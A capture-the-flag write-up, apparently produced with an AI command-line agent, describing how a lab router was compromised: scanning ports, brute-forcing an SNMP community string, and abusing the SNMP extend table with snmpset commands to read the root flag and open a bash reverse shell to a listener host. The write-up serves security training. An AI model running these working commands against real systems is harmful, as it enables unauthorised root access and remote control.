# Operation TakeOver - Technical Write-up
(*solved using gemin-cli*)
## 1. Initial Reconnaissance & Discovery

The assessment began with a full TCP port scan of the target.

### Initial TCP Scan Findings:
*   **22/tcp**: SSH (OpenSSH 8.2p1) - Required public key authentication; no password access.
*   **179/tcp**: BGP - The port was open, but the daemon did not respond to standard peering requests, indicating a requirement for a specific ASN or neighbor IP.
*   **2623/tcp**: FRRouting VTY - A management terminal that was protected by a non-default password. Extensive brute-forcing with the top 10,000 passwords from `rockyou.txt` failed.

### The Pivot to UDP:
With all TCP management and routing interfaces hardened, the strategy shifted to enumerating UDP services. A targeted scan of the top 100 UDP ports revealed a critical discovery:
*   **161/udp**: SNMP (Simple Network Management Protocol) was **Open**.

### Identifying the SNMP Community String:
Since SNMP often uses "public" or "private" as defaults, I first tested these manually. When they failed, I pivoted to a dictionary attack using `onesixtyone` with a specialized wordlist of common and leetspeak community strings.
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.48.175.156
```
This identified the valid community string: **`pr1v4t3`**.

### Verifying Write Access:
To confirm the level of access granted by the `pr1v4t3` community, I used `snmp-check`:
```bash
snmp-check -c pr1v4t3 -v 2c 10.48.175.156 -w
```
**Result:** `[*] Write access permitted!`

## 2. Why SNMP? (Strategic Decision)

SNMP was prioritized over continuing the BGP/VTY brute-force for several reasons:
1.  **Information Leakage**: SNMP provides deep visibility into the system, including process lists, network configurations, and software versions.
2.  **Weak Access Control**: In lab and CTF environments, SNMP is frequently misconfigured with high-privilege access.
3.  **Command Injection**: The `NET-SNMP-EXTEND-MIB` allows for custom command execution if write access is enabled, providing a potential path to RCE without needing to crack the VTY password.

## 3. Vulnerability Analysis

A walk of the SNMP tree using the `pr1v4t3` string revealed that the router was an **Ubuntu 20.04 container**. 

Crucially, I inspected the **VACM (View-based Access Control Model)** table. This table defines who can read and write to which part of the SNMP tree. The data showed that the `notConfigGroup` (to which `pr1v4t3` was mapped) had **full write access** to the entire tree (`.1`).

This confirmed that the router was vulnerable to **Remote Code Execution (RCE)** via the SNMP `extend` table.

## 4. Exploitation: SNMP Command Injection (RCE)

The `nsExtendConfigTable` allows an attacker to define a new OID that, when queried, executes a script on the host.

### Approach 1: Directly Reading the Flag
I defined a new extension called `flags` that executed a bash command to read the flag.

**Command Injection:**
```bash
snmpset -v 2c -c pr1v4t3 10.48.175.156 \
  1.3.6.1.4.1.8072.1.3.2.2.1.2.5.102.108.97.103.115 s "/bin/bash" \
  1.3.6.1.4.1.8072.1.3.2.2.1.3.5.102.108.97.103.115 s "-c \"cat /root/flag.txt\"" \
  1.3.6.1.4.1.8072.1.3.2.2.1.21.5.102.108.97.103.115 i 4
```
*(The suffix `5.102.108.97.103.115` is the ASCII encoding for the name "flags")*

**Retrieving the Flag:**
By querying the output table, the agent executed the command and returned the result:
```bash
snmpwalk -v 2c -c pr1v4t3 10.48.175.156 1.3.6.1.4.1.8072.1.3.2.3.1.1.5.102.108.97.103.115
```
**Flag:** `THM{SNMP_SO_NOT_MY_PROBLEM}`

---

### Approach 2: Obtaining a Reverse Shell
To gain full interactive control, I updated the extension to trigger a reverse shell.

1.  **Listener**: `nc -lvp 6969`
2.  **Injection**:
```bash
snmpset -v 2c -c pr1v4t3 10.48.175.156 \
  1.3.6.1.4.1.8072.1.3.2.2.1.2.5.102.108.97.103.115 s "/bin/bash" \
  1.3.6.1.4.1.8072.1.3.2.2.1.3.5.102.108.97.103.115 s "-c \"/bin/bash -i >& /dev/tcp/192.168.131.247/6969 0>&1\"" \
  1.3.6.1.4.1.8072.1.3.2.2.1.21.5.102.108.97.103.115 i 4
```
3.  **Trigger**:
```bash
snmpget -v 2c -c pr1v4t3 -t 10 10.48.175.156 1.3.6.1.4.1.8072.1.3.2.3.1.1.5.102.108.97.103.115
```

## 5. Conclusion

The "Medium" rating of this challenge was addressed by pivoting away from the well-defended routing services and exploiting a critical misconfiguration in the SNMP management service. This provided direct root-level RCE, allowing for immediate acquisition of the target flag.